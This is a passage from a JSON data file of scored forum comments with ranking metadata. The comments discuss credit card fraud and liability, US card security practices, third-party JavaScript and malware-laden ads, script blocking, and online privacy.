"__MatrixMan__", "dom": 80, "sr": 63, "sc": 3.26, "ep": 3.88, "bs": 0.0, "d": 4, "age": 22.35, "grav": 313.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 104, "qw": 0, "k": 10035, "kpp": 2.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.56, "fa": 0.0, "gp": 0.149, "bl": 0.0, "ds": 0.0, "txt": "We pay for this with higher prices, which the merchant uses to pay the various payment gatekeepers, which is why those gatekeepers don't care to prevent the fraud.  They also recoup the cost of fraud by aggregating data on our spending habits into various data products (inevitably used by scammers), and by making deals with people who want to shut payments off for people they don't like (e.g. this happened to wikileaks).\n\nI'd prefer to have good tools for preventing fraud, and then take on the liability.  This whole subscription-model economy isn't exactly working out.  We just end up with consequences that are hard to see."}, {"id": 50675047, "au": "paulryanrogers", "dom": 40, "sr": 64, "sc": 3.26, "ep": 3.81, "bs": 0.0, "d": 2, "age": 10.93, "grav": 100.2, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 47, "qw": 0, "k": 12307, "kpp": 1.7, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.207, "fa": 0.34, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "Are there crypto currencies not vulnerable to 51% attacks, poor / laughable scalability, and offering truly anonymous payment?\n\nBecause with problems like these I struggle to see how asymmetric crypto is such a killer app. Could asymmetric crypto be introduced to traditional ecommerce without the dead weight of crypto currency implementations?"}, {"id": 50674124, "au": "NordStreamYacht", "dom": 246, "sr": 65, "sc": 3.26, "ep": 3.8, "bs": 0.0, "d": 0, "age": 13.39, "grav": 137.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 34, "qw": 0, "k": 584, "kpp": 2.7, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.314, "fa": 0.0, "gp": 0.49, "bl": 0.0, "ds": 0.0, "txt": "I bought a software license from a European website on Black Friday and my card was instantly blocked and replaced by my bank.\n\nInterestingly, the legitimate transaction went through.\n\nNo idea what triggered the fraud management system."}, {"id": 50668945, "au": "ranger_danger", "dom": 74, "sr": 66, "sc": 3.26, "ep": 3.78, "bs": 0.0, "d": 2, "age": 23.61, "grav": 342.8, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 61, "qw": 0, "k": 2682, "kpp": 0.7, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.61, "fa": 0.0, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "Credit cards in the US are stuck in the past. NFC/MFA/PIN are not required (in a legal sense) at all, and every bank handles things slightly differently. Chip+PIN is rare compared to other countries. Traditional bank apps here also do not support direct NFC payments like they do in Europe, and many banks still rely on insecure SMS-based 2FA."}, {"id": 50671941, "au": "lxgr", "dom": 69, "sr": 67, "sc": 3.26, "ep": 3.69, "bs": 0.0, "d": 4, "age": 18.84, "grav": 236.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 97, "qw": 0, "k": 22198, "kpp": 2.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.566, "fa": 0.0, "gp": 0.009, "bl": 0.0, "ds": 0.0, "txt": "US issuers largely just can't be bothered to do it. They'd apparently rather take the hit on lost transactions or fraud they are liable for than do something as drastic as sending an OTP to their cardholders (and make them reach for a competitor's card next time)... Same reason PINs on credit cards are not a thing in the US.\n\nThis is a typical problem that can probably only be solved by regulator intervention, since the game theory really might make not supporting 3DS challenges the optimal move. The stick of the 3DS liability shift was apparently not painful enough."}, {"id": 50672129, "au": "lxgr", "dom": 112, "sr": 68, "sc": 3.26, "ep": 3.66, "bs": 0.0, "d": 1, "age": 18.44, "grav": 228.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 104, "qw": 0, "k": 22198, "kpp": 2.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.494, "fa": 0.0, "gp": 0.106, "bl": 0.0, "ds": 0.0, "txt": "This wouldn't change the fact that the site owner gets to decide which code runs on their site, whether in your browser or on their backend. In a counterfactual world in which Javascript never became a thing, I'm sure there'd now be all kinds of horribly sketchy server-side plugins causing very similar types of problems.\n\nIn both worlds, the problem is who a site owner decides to grant access to your shopping session, not the fact that access can be granted at all. Or how would you ban them from e.g. insecurely transmitting your card data to their payment service processor on their backend? You just wouldn't see it."}, {"id": 50669587, "au": "slfnflctd", "dom": 276, "sr": 69, "sc": 3.26, "ep": 3.66, "bs": 0.0, "d": 2, "age": 22.71, "grav": 321.4, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 85, "qw": 0, "k": 2530, "kpp": 2.5, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "ads_site", "flbl": "Ads & Site (Javascript)", "urls": [], "ig": 1.521, "fa": 0.0, "gp": 0.057, "bl": 0.0, "ds": 0.0, "txt": "This has never felt right to me.  Being required to use a new opaque app for every little thing, and take my time to enter a bunch of (often the same set of) data by hand on an awful keyboard, so they can harvest it and try to find a way to monetize it... always seemed utterly absurd.\n\nEvery time I have to do it, it's under protest, and it gets increasingly irritating with time.  My partner is tired of hearing me complain about it but I can't help myself."}, {"id": 50676420, "au": "miki123211", "dom": 33, "sr": 70, "sc": 3.26, "ep": 3.62, "bs": 0.0, "d": 5, "age": 5.77, "grav": 40.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 94, "qw": 0, "k": 12952, "kpp": 4.9, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.135, "fa": 0.22, "gp": 0.228, "bl": 0.0, "ds": 0.0, "txt": "It's a problem because it leaks information about you to somebody with a personal interest in you.\n\nYes, Facebook knows your IP. Facebook, however, is unlikely to tel all your friends that you've been to Oklahoma last week, exposing your affair. Your neighbor just might.\n\nThere are two different kinds of privacy on the internet: privacy from soulless machines, and privacy from people who know you in real life. This is about the latter (and the latter is much more important to most people), while most privacy talk in tech circles is about the former."}, {"id": 50669633, "au": "adellsworth", "dom": 249, "sr": 71, "sc": 3.26, "ep": 3.59, "bs": 0.0, "d": 1, "age": 22.63, "grav": 319.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 52, "qw": 0, "k": 9, "kpp": 0.8, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.189, "fa": 0.28, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "Where does \"meatlife\" come from? is it the replacement of \"IRL\"? IRL was benign (yet a bit of a misnomer — the web is real), whereas meatlife categorizes things more cleanly though more crudely. I've never heard it before and was wondering: are there other trends of denigrating \"oldspeak\" web terms to raw, visceral descriptors?"}, {"id": 50670163, "au": "ModernTimes", "dom": 206, "sr": 72, "sc": 3.26, "ep": 3.58, "bs": 0.0, "d": 1, "age": 21.94, "grav": 303.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 46, "qw": 0, "k": 102, "kpp": 4.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "block_malware", "flbl": "Block & Malware (Crimes)", "urls": [], "ig": 0.937, "fa": 0.28, "gp": 0.403, "bl": 0.0, "ds": 0.0, "txt": "Google Adsense is completely infested with malware ads, and they refuse to provide tools so website publishers can prevent the scams.\n\nTherefore Google Adsense is indistinguishable from a malware company, even if they didn't set out to be.\n\nI don't understand why these people are not in prison."}, {"id": 50670431, "au": "francescovv", "dom": 254, "sr": 73, "sc": 3.26, "ep": 3.57, "bs": 0.0, "d": 1, "age": 21.54, "grav": 294.6, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 37, "qw": 0, "k": 60, "kpp": 2.2, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.181, "fa": 0.28, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "My bank forces a yes/no confirmation in the app (with merchant name and euro amount) for each transaction.\n\nNot the greatest UX (can't pay with a card on a plane for example), but this does entirely solve skimming problem."}, {"id": 50676296, "au": "vladms", "dom": 61, "sr": 74, "sc": 3.26, "ep": 3.56, "bs": 0.0, "d": 4, "age": 6.26, "grav": 44.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 106, "qw": 0, "k": 844, "kpp": 1.5, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "crowd_chatter", "facet": "card_fraud", "flbl": "Card & Fraud (Credit)", "urls": [], "ig": 1.514, "fa": 0.0, "gp": 0.0, "bl": 0.0, "ds": 0.0, "txt": "Sure, fine to have a frictionless flow, the annoying part for me as a consumer is that I can't choose to disable that.\n\nThe result is that the burden is on me to check small transaction (which are anyhow harder to identify, remember, I did it on that card because I barely use it once/twice a month).\n\nSo while I understand why the system is like that, I still think that much before other measures (liability, law suits, securing every merchant site) a system that allows user more control would be more efficient. Of course banks have all interest to point out for other \"weak links\" because changing their system would cost them more."}, {"id": 50671110, "au": "Terr_", "dom": 251, "sr": 75, "sc": 3.26, "ep": 3.55, "bs": 0.0, "d": 3, "age": 20.37, "grav": 268.7, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 55, "qw": 0, "k": 28486, "kpp": 2.6, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.391, "fa": 0.0, "gp": 0.191, "bl": 0.0, "ds": 0.0, "txt": "My vague sense of when to use one or the other:\n\n* \"IRL\" is to describe a separate process, like an \"IRL purchase at the store\", distinct from an online purchase.\n\n* \"Meat-space\" when it's a combined process and you need to distinguish between phases which occur in different contexts, like \"this API call causes X to happen in meat-space.\""}, {"id": 50673608, "au": "s_u_d_o", "dom": 236, "sr": 76, "sc": 3.26, "ep": 3.54, "bs": 0.0, "d": 0, "age": 14.7, "grav": 158.9, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 41, "qw": 0, "k": 34, "kpp": 1.0, "td": 0.0, "mod": 0, "pp": 0, "meme": 0, "tier": "crowd_chatter", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.154, "fa": 0.0, "gp": 0.568, "bl": 0.0, "ds": 0.0, "txt": "Why don’t  google adsense & other ad providers sandbox those ads? And never allow any JS to be executed at client side? Wouldn’t this solve it all? Why doesnt our browser act like a renderer of those ads, without any possible JS execution?"}, {"id": 50669876, "au": "eddythompson80", "dom": 228, "sr": 77, "sc": 3.26, "ep": 3.78, "bs": 0.27, "d": 3, "age": 22.32, "grav": 312.5, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 53, "qw": 0, "k": 3629, "kpp": 3.1, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "crowd_chatter", "facet": "browsers_etc", "flbl": "Browsers & Etc (Ads)", "urls": [], "ig": 1.532, "fa": 0.0, "gp": 0.123, "bl": 0.1, "ds": 0.0, "txt": "Not strictly speaking true. You can search fine blocking all 3P (i.e: non www.google.com) scripts.\n\nHowever, even if, sure. You might allow (or need or want) google.com domain to run JS, but that doesn't mean all the world wide web gets the same escalation of privileges. That sounds insane to me."}, {"id": 50669826, "au": "eddythompson80", "dom": 219, "sr": 78, "sc": 3.26, "ep": 3.78, "bs": 0.27, "d": 3, "age": 22.39, "grav": 314.1, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 77, "qw": 0, "k": 3629, "kpp": 3.1, "td": 0.0, "mod": 0, "pp": 3, "meme": 0, "tier": "crowd_chatter", "facet": "block_malware", "flbl": "Block & Malware (Crimes)", "urls": [], "ig": 1.532, "fa": 0.0, "gp": 0.123, "bl": 0.1, "ds": 0.0, "txt": "I do it. It's not unrealistic or even really that bothersome. You just have to be willing to walk away from a page that asks you to load 40 scrips from 17 different domains to read an article. Worst case scenario, you drop down to \"just ad blocking\" in a glassbreak type scenairo but at least you're aware that this random page pinged 17 different domains and loaded 40 scripts. It's an extra click or 2 on ublock origin (if you must have it)"}, {"id": 50671465, "au": "vladms", "dom": 58, "sr": 79, "sc": 3.26, "ep": 3.49, "bs": 0.0, "d": 2, "age": 19.77, "grav": 256.0, "surf": 0.0, "fade": "c00", "dt": 0, "ut": 0, "lu": 0, "w": 74, "qw": 0, "k": 844, "kpp": 1.5, "td": 0.0, "
